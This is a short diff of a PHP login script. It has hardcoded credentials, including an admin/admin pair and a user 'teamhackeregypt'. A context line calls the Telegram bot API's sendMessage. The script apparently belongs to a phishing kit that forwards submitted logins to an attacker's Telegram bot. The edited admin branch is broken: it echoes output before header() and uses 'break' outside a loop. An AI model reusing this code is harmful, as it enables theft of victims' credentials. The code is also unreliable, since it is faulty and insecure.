@@ -65,37 +65,15 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
 if ($username == "teamhackeregypt" && $password == "01020111745") {
     header("Location: wa.php");
     
-}elseif($username=="admin"&&$password=="admin"){
-header("Location: admin.html")
+}elseif($username=="admin" && $password=="admin"){
+    echo "this is admin page welcome mr admin";
+
+    header("Location: admin.html");
+        break;
 } else {
     echo "wrong password";      
     header("Location: index.php");
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
